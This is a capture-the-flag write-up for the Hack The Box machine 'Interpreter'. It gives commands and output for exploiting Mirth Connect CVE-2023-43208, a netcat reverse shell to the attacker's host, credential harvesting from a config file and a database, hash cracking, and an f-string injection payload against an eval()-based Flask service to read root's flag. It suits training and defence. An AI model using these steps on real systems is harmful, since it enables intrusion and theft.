## Summary

Interpreter is a Medium Linux machine running **Mirth Connect 4.4.0**,
vulnerable to an unauthenticated RCE (CVE-2023-43208) that yields a shell as the
`mirth` service user. Database credentials in `mirth.properties` give access to
a local MariaDB, exposing a PBKDF2 hash for `sedric` that is cracked for SSH
access. A root-owned Flask service uses `eval()` on an f-string template, and an
**f-string injection** is used to read the **root** flag as root.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Interpreter | Medium | Linux | Hack The Box |

## Attack Path

1. Nmap reveals SSH and Mirth Connect on HTTP/HTTPS.
2. The version is confirmed as Mirth Connect 4.4.0.
3. Unauthenticated RCE is exploited (CVE-2023-43208).
4. A reverse shell is obtained as `mirth`.
5. Config files reveal local database credentials.
6. The MariaDB yields a PBKDF2 hash for `sedric`.
7. The hash is cracked and reused for SSH access.
8. A root-owned Flask service uses `eval()` on user input.
9. F-string injection reads the root flag.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.129.244.184
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.2p1 (Debian) |
| 80 | HTTP | Jetty — Mirth Connect Administrator |
| 443 | HTTPS | Jetty — Mirth Connect |

The exposed **Mirth Connect Administrator** was the most promising vector.

## Web Enumeration

The application presented **Mirth Connect by NextGen Healthcare**, with a Mirth
Connect Administrator and a web dashboard sign-in.

## Exploitation — Mirth Connect RCE (CVE-2023-43208)

A detection script confirmed the version and vulnerability:

```bash
python3 detection.py https://10.129.244.184
```

```
Server version: 4.4.0
Vulnerable to CVE-2023-43208.
```

The public exploit was used to trigger a reverse shell:

```bash
python3 CVE-2023-43208.py -u https://10.129.244.184 -c 'nc -c sh 10.10.14.228 4444'
```

A listener received the connection:

```bash
nc -lvnp 4444
```

```
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

## Initial Access (User)

As `mirth`, the application configuration exposed plaintext database
credentials in `/usr/local/mirthconnect/conf/mirth.properties`:

```
database.username = mirthdb
database.password = MirthPass123!
```

These were used to access the local MariaDB:

```bash
mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
select * from PERSON;
select * from PERSON_PASSWORD;
```

This revealed the user `sedric` and a Base64-encoded password hash:

```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

## Privilege Escalation

### Cracking the hash

The hash was converted to a Hashcat-compatible **PBKDF2-HMAC-SHA256** format
(600,000 iterations) and cracked:

```bash
hashcat -m 10900 sedric_hash.txt /usr/share/wordlists/rockyou.txt
```

```
snowflake1
```

The password was reused for SSH (lateral movement to `sedric`):

```bash
ssh sedric@10.129.244.184
```

The user flag lives at `/home/sedric/user.txt`.

### Root-owned Flask service

Enumeration found a Python process running as root:

```bash
ps aux | grep python
# /usr/bin/python3 /usr/local/bin/notif.py
```

`notif.py` ran a local Flask server on `127.0.0.1:54321` with an `/addPatient`
endpoint. It restricted remote access (`request.remote_addr != "127.0.0.1"`),
but local access was available via the `sedric` shell. The critical flaw was in
the template function:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
return eval(f"f'''{template}'''")
```

The input validation allowed `{` and `}`, so an attacker-controlled field
reaching the `eval()` could execute Python expressions as root.

### F-string injection

The `firstname` field was used to read the root flag:

```bash
python3 - << 'EOF'
import requests
xml = """<patient>
<firstname>{open("/root/root.txt").read()}</firstname>
<lastname>B</lastname>
<sender_app>X</sender_app>
<timestamp>t</timestamp>
<birth_date>01/01/2000</birth_date>
<gender>M</gender>
</patient>"""
r = requests.post("http://127.0.0.1:54321/addPatient", data=xml)
print(r.text)
EOF
```

The HTTP response returned the contents of `/root/root.txt`, confirming code
execution as root.

## Vulnerability Analysis

**Mirth Connect RCE (CVE-2023-43208)** — Mirth Connect 4.4.0 allowed
unauthenticated remote command execution, giving the foothold as the `mirth`
service user. Fix: upgrade Mirth Connect to a patched version.

**Plaintext credentials in configuration** — `mirth.properties` stored database
credentials in cleartext, exposing the local database and stored user hashes.
Fix: encrypt configuration secrets and restrict file permissions.

**Credential reuse** — the cracked database password for `sedric` was also valid
for SSH, enabling lateral movement to an interactive account. Fix: enforce
unique credentials per service.

**Insecure `eval()` on user input (f-string injection)** — a root-owned Flask
service evaluated a template with `eval()` and allowed `{}` in input, enabling
Python code execution as root. Fix: never `eval()` user-controlled data; build
output with safe string formatting and drop root privileges.

## Tools Used

- Nmap
- Python 3
- Netcat
- MariaDB/MySQL client
- Hashcat
- SSH

## Key Takeaways

- Exposed admin panels should be prioritized; an exact version often turns enumeration into direct exploitation.
- Credentials in config files remain a common post-exploitation vector.
- Database hashes may need format conversion before cracking.
- `eval()` on user-controlled input is extremely dangerous, especially with f-strings.
- Localhost-only restrictions don't help once the attacker already has local access.
